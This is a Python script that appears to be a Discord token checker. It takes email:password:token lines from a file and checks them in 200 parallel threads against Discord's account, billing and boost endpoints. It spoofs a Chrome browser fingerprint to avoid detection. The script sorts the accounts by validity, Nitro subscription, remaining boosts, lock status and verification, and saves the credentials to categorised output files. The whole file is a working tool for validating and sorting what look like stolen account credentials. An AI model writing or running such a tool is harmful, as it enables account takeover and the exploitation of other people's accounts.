import time
import concurrent.futures
from colorama import Fore, Style;

blue = Fore.BLUE;
red = Fore.RED;
warn = Fore.YELLOW;
green = Fore.GREEN;
gray = Fore.LIGHTBLACK_EX;
white_red = Fore.LIGHTRED_EX;
white_green = Fore.LIGHTGREEN_EX;
white_warn = Fore.LIGHTYELLOW_EX;
white_blue = Fore.LIGHTBLUE_EX;
reset_colors = Style.RESET_ALL
from datetime import datetime
from base64 import b64decode as decoder
import tls_client
import base64

THREADS = 200
requests = tls_client.Session(client_identifier="chrome120", random_tls_extension_order=True)
boost1 = 0
boost2 = 0
noboost = 0
nonitro = 0
locked = 0
invalid = 0
ratelimited = 0


class Console:
    def __init__(self, debug=False) -> None:
        self.debug = debug

    def error(self, x):
        if self.debug:
            print(
                f"{red}[- ERROR -]{reset_colors} - {gray}[{datetime.now().date()} - {datetime.now().now().strftime('%H:%M:%S')}]{reset_colors} |\t {white_red}{x}{reset_colors}")
        else:
            print(f"{red}[-]{reset_colors}\t {red + x}{reset_colors}")

    def success(self, x):
        if self.debug:
            print(
                f"{green}[+ Success +]{reset_colors} - {gray}[{datetime.now().date()} - {datetime.now().now().strftime('%H:%M:%S')}]{reset_colors} |\t {white_green + x}{reset_colors}")
        else:
            print(f"{green}[+]{reset_colors}\t {white_green + x}{reset_colors}")

    def warn(self, x, t=0):
        if self.debug:
            print(
                f"{warn}[! {'WARNING' if t == 0 else 'FAILED'} !]{reset_colors} - {gray}[{datetime.now().date()} - {datetime.now().now().strftime('%H:%M:%S')}]{reset_colors} |\t {white_warn + x}{reset_colors}")
        else:
            print(f"{warn}[!]{reset_colors}\t {white_warn + x}{reset_colors}")

    def info(self, x):
        if self.debug:
            print(
                f"{blue}[* INFO *]{reset_colors} - {gray}[{datetime.now().date()} - {datetime.now().now().strftime('%H:%M:%S')}]{reset_colors} |\t {white_blue + x}{reset_colors}")
        else:
            print(f"{blue}[*]{reset_colors}\t {white_blue + x}{reset_colors}")


console = Console(debug=True)


class Utils:
    def __init__(self) -> None:
        pass

    def calculateTimeRemaining(self, date):
        date = datetime.strptime(date.split("T")[0], '%Y-%m-%d')
        current_date = datetime.now()
        time_remaining = date - current_date
        days = time_remaining.days
        return f"{days} days"

    def get_account_age(self, token):
        try:
            token_parts = token.split('.')
            if len(token_parts) >= 2:
                padding = "=" * (4 - len(token_parts[0]) % 4)
                decoded = base64.b64decode(token_parts[0] + padding)
                user_id = int(decoded)
                timestamp = ((user_id >> 22) + 1420070400000) / 1000
                creation_date = datetime.fromtimestamp(timestamp)
                now = datetime.now()

                diff = now - creation_date
                years = diff.days // 365
                remaining_days = diff.days % 365
                hours = diff.seconds // 3600
                minutes = (diff.seconds % 3600) // 60

                age_parts = []
                if years > 0:
                    age_parts.append(f"{years} year{'s' if years != 1 else ''}")
                if remaining_days > 0:
                    age_parts.append(f"{remaining_days} day{'s' if remaining_days != 1 else ''}")
                if hours > 0:
                    age_parts.append(f"{hours} hour{'s' if hours != 1 else ''}")
                if minutes > 0:
                    age_parts.append(f"{minutes} minute{'s' if minutes != 1 else ''}")

                return " , ".join(age_parts) if age_parts else "Less than a minute"
            return "Unknown"
        except:
            return "Unknown"

    def formate(self, token):
        if ":" in token:
            email, password, token = token.split(":")
            return token
        else:
            return token

    def format_credential(self, credential):
        parts = credential.split(':')
        if len(parts) == 3:
            return parts
        else:
            return None


class Checker:
    def __init__(self) -> None:
        self.utils = Utils()
        self.sp = 'eyJvcyI6IldpbmRvd3MiLCJicm93c2VyIjoiQ2hyb21lIiwiZGV2aWNlIjoiIiwic3lzdGVtX2xvY2FsZSI6ImVuLVVTIiwiYnJvd3Nlcl91c2VyX2FnZW50IjoiTW96aWxsYS81LjAgKFdpbmRvd3MgTlQgMTAuMDsgV2luNjQ7IHg2NCkgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgQ2hyb21lLzEyMC4wLjAuMCBTYWZhcmkvNTM3LjM2IiwiYnJvd3Nlcl92ZXJzaW9uIjoiMTIwLjAuMC4wIiwib3NfdmVyc2lvbiI6IjEwIiwicmVmZXJyZXIiOiIiLCJyZWZlcnJpbmdfZG9tYWluIjoiIiwicmVmZXJyZXJfY3VycmVudCI6IiIsInJlZmVycmluZ19kb21haW5fY3VycmVudCI6IiIsInJlbGVhc2VfY2hhbm5lbCI6InN0YWJsZSIsImNsaWVudF9idWlsZF9udW1iZXIiOjI1NjIzMSwiY2xpZW50X2V2ZW50X3NvdXJjZSI6bnVsbH0='

    def checkBoostsInToken(self, headers, proxy=None):
        global noboost
        global boost2
        global boost1
        boosts = 0
        request = requests.get('https://discord.com/api/v9/users/@me/guilds/premium/subscription-slots',
                               headers=headers, proxy=proxy)
        if request.status_code == 200:
            js = request.json()
            for boost in js:
                if not boost["cooldown_ends_at"]:
                    boosts += 1
        if boosts == 0:
            noboost += 1
        if boosts == 1:
            boost1 += 1
        if boosts == 2:
            boost2 += 1
        return boosts

    def getUserInfo(self, headers, proxy=None):
        request = requests.get('https://discord.com/api/v9/users/@me', headers=headers, proxy=proxy)
        if request.status_code == 200:
            data = request.json()
            return {
                'email_verified': data.get('verified', False),
                'phone_verified': bool(data.get('phone', False))
            }
        return {
            'email_verified': False,
            'phone_verified': False
        }

    def check(self, credential, proxy=None):
        global boost1
        global boost2
        global noboost
        global nonitro
        global locked
        global invalid
        global ratelimited
        token_parts = self.utils.format_credential(credential)
        if not token_parts:
            console.error("Invalid credential format. Expected email:pass:token.")
            return 0
        email, password, token = token_parts
        hasNitro = False
        nitroTime = None
        isLocked = True
        boosts = 0

        # Get account age
        account_age = self.utils.get_account_age(token)

        headers = {
            'accept': '*/*',
            'accept-language': 'en-US,en;q=0.9',
            'authorization': token,
            'referer': 'https://discord.com/channels/@me',
            'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120", "Google Chrome";v="120"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-origin',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'x-debug-options': 'bugReporterEnabled',
            'x-discord-locale': 'en-US',
            'x-super-properties': self.sp,
        }

        # Get user verification info
        user_info = self.getUserInfo(headers, proxy)
        email_verified = user_info['email_verified']
        phone_verified = user_info['phone_verified']

        request = requests.get(f'https://discord.com/api/v9/users/@me/billing/subscriptions', headers=headers,
                               proxy=proxy)
        statusCode = request.status_code
        if statusCode == 401:
            isLocked = 401
        if statusCode == 429:
            ratelimited += 1
            console.warn(f"{credential[:20]}**** | Ratelimited [Ratelimit number : {ratelimited}]")
            return 0
        if statusCode == 200:
            isLocked = False
            js = request.json()
            if len(js) != 0:
                hasNitro = True
                nitroTime = self.utils.calculateTimeRemaining(js[0]["current_period_end"])
                boosts = self.checkBoostsInToken(headers, proxy)
            console.info(
                f"{credential[:20]}**** | {gray}Info :{reset_colors} [{gray}Status : {f'{red}LOCKED{reset_colors}' if isLocked == True else f'{white_green}UNLOCKED{reset_colors}' if isLocked == False else f'{red}INVALID{reset_colors}'}, {gray}Nitro : {reset_colors}{f'{white_green}YES{reset_colors}, {gray}Subscription Date Expire in : {reset_colors}{white_blue}{nitroTime}{reset_colors}' if hasNitro else f'{red}NO{reset_colors}, {gray}Subscription Date Expire in : {reset_colors}{white_blue}{nitroTime}{reset_colors}'}, {gray}Boosts left : {green}{boosts}{reset_colors}, {gray}Account Age : {white_blue}{account_age}{reset_colors}, {gray}Email Verified : {f'{white_green}YES{reset_colors}' if email_verified else f'{red}NO{reset_colors}'}, {gray}Phone Verified : {f'{white_green}YES{reset_colors}' if phone_verified else f'{red}NO{reset_colors}'}]")
        if statusCode == 401:
            invalid += 1
            console.info(
                f"{credential[:20]}**** | {gray}Info :{reset_colors} [{gray}Status : {f'{red}LOCKED{reset_colors}' if isLocked == True else f'{white_green}UNLOCKED{reset_colors}' if isLocked == False else f'{red}INVALID{reset_colors}'}, {gray}Nitro : {reset_colors}{f'{white_green}YES{reset_colors}, {gray}Subscription Date Expire in : {reset_colors}{white_blue}{nitroTime}{reset_colors}' if hasNitro else f'{red}NO{reset_colors}, {gray}Subscription Date Expire in : {reset_colors}{white_blue}{nitroTime}{reset_colors}'}, {gray}Account Age : {white_blue}{account_age}{reset_colors}, {gray}Email Verified : {f'{white_green}YES{reset_colors}' if email_verified else f'{red}NO{reset_colors}'}, {gray}Phone Verified : {f'{white_green}YES{reset_colors}' if phone_verified else f'{red}NO{reset_colors}'}]")
            with open(f"output/invalid.txt", "a") as f:
                f.write(f"{credential}\n")
                f.close()
            return 0
        if hasNitro:
            with open(f"output/{boosts}boosts.txt", "a") as f:
                f.write(f"{credential}\n")
                f.close()
        if not hasNitro:
            nonitro += 1
            with open(f"output/nonitro.txt", "a") as f:
                f.write(f"{credential}\n")
                f.close()
        if isLocked:
            locked += 1
            with open(f"output/locked.txt", "a") as f:
                f.write(f"{credential}\n")
                f.close()
        return 1


checker = Checker()


def main():
    credentials = open("tokens.txt").read().splitlines()
    start = time.time()
    with concurrent.futures.ThreadPoolExecutor(max_workers=THREADS) as executor:
        results = [executor.submit(checker.check, credential) for credential in credentials]
    end = time.time() - start
    console.success(f"Checked {len(credentials)} credentials in {end}s")
    console.info(
        f"1 Boost : {boost1} | 2 Boosts : {boost2} | No Nitro : {nonitro} | Locked : {locked} | Invalid : {invalid} | Ratelimited {ratelimited} time(s)")


if __name__ == "__main__":
    main()